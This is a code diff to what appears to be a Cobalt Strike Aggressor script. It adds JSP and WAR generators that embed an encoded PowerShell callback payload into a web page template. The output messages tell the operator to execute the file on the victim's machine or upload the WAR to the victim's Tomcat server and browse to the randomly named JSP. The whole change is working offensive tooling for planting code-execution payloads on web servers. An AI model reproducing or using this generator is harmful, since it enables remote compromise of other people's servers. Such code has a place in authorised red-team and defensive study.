@@ -21,6 +21,14 @@
 #	Build a JScript file that downloads a stageless EXE
 #	from a site hosted by Cobalt Strike. (Host setup included)
 
+# JSP Generator:
+#
+#	Build a JSP file that executes a PowerShell callback.
+
+# WAR Generator:
+#
+#	Build a WAR file that once uploaded to Tomcat, executes a PowerShell callback.
+
 # Change this to set the payloads to External/Internal Hosts / IPs
 
 global('$hostip', '$jsport', '$ssl','$TEMPDIR');
@@ -89,7 +97,7 @@ sub generate_payload {
 	dialog_description($dialog, "Generates a payload from a user created template.");
 	drow_listener($dialog, "listener", "Listener: ");
 	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged","Stageless"));
-	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript"));
+	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript", "JSP","WAR"));
 	drow_checkbox($dialog, "x64", "x64: ", "Use x64 Payload")
 	dbutton_action($dialog, "Generate");
 	dialog_show($dialog);
@@ -123,7 +131,7 @@ sub output {
 			});
 		}
 		else {
-			artifact_stageless($3['listener'], "powershell", $arch, "", &ps1stageless);
+			artifact_stageless($3['listener'], "powershell", $arch, "", &ps1stageless_xml);
 		}
 	}
 	else if ($3['output'] eq 'JSC JScript') {
@@ -188,9 +196,62 @@ sub output {
 			});
 		}
 	}
+	else if ($3['output'] eq 'JSP') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+
+		if ($3['payload_type'] eq "Staged") {
+			$payload_string = artifact($3['listener'], "powershell", $arch);
+			$handle = openf(script_resource("./templates/jsp_template.jsp"));
+			$data   = readb($handle, -1);
+			$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($payload_string)));
+			closef($handle);
+			$name = prompt_file_save("payload.jsp", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				$filename = pop(split("/", $1));
+				show_message("Execute the jsp file on the victims machine.");
+			});
+		}
+		else {
+			artifact_stageless($3['listener'], "powershell", $arch, "", &ps1stageless_jsp);
+		}
+	}
+	else if ($3['output'] eq 'WAR') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+
+		if ($3['payload_type'] eq "Staged") {
+			$payload_string = artifact($3['listener'], "powershell", $arch);
+			$handle = openf(script_resource("./templates/jsp_template.jsp"));
+			$data   = readb($handle, -1);
+			$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($payload_string)));
+			$name = prompt_file_save("payload.war", {
+				local('$outfile');
+				$jsp_file = "$TEMPDIR". random_string(rand(range("5-10"))) .".jsp";
+				$outfile = openf("> $+ $jsp_file");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				exec("zip -j -m $1 $jsp_file");
+				$filename = pop(split("/", $1));
+				$pathname = substr($filename, 0, -4);
+				$jsp_name = pop(split("/", $jsp_file));
+				show_message("Upload $filename on the victims Tomcat instance. Navigate to <victim>\/".@pathname[0]."\/$jsp_name to execute.");
+			});
+		}
+		else {
+			artifact_stageless($3['listener'], "powershell", $arch, "", &ps1stageless_war);
+		}
+	}
 }
 
-sub ps1stageless {
+sub ps1stageless_xml {
 	$handle = openf(script_resource("./templates/msbuild_template.xml"));
 	$data   = readb($handle, -1);
 	$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($1)), "%%TASKNAME%%", random_string(rand(range("10-15"))), "%%TARGETNAME%%", random_string(rand(range("10-15"))), "%%VARIABLE%%", random_string(rand(range("10-15"))), "%%PIPELINE%%", random_string(rand(range("10-15"))), "%%RUNSPACE%%", random_string(rand(range("10-15"))));
@@ -205,6 +266,39 @@ sub ps1stageless {
 		});
 	});
 }
+
+sub ps1stageless_jsp {
+	$handle = openf(script_resource("./templates/jsp_template.jsp"));
+	$data   = readb($handle, -1);
+	$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($1)));
+	$name = prompt_file_save("payload.jsp", {
+		local('$outfile');
+		$outfile = openf("> $+ $1");
+		writeb($outfile, $fdata);
+		closef($outfile);
+		$filename = pop(split("/", $1));
+		show_message("Execute the jsp file on the victims machine.");
+	});
+}
+
+sub ps1stageless_war {
+	$handle = openf(script_resource("./templates/jsp_template.jsp"));
+	$data   = readb($handle, -1);
+	$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($1)));
+	$name = prompt_file_save("payload.war", {
+		local('$outfile');
+		$jsp_file = "$TEMPDIR". random_string(rand(range("5-10"))) .".jsp";
+		$outfile = openf("> $+ $jsp_file");
+		writeb($outfile, $fdata);
+		closef($outfile);
+		exec("zip -j -m $1 $jsp_file");
+		$filename = pop(split("/", $1));
+		$pathname = substr($filename, 0, -4);
+		$jsp_name = pop(split("/", $jsp_file));
+		show_message("Upload $filename on the victims Tomcat instance. Navigate to <victim>\/$pathname\/$jsp_name to execute.");
+	});
+}
+
 
 sub random_string {
 	$limit = rand(range("5-". int($1)));
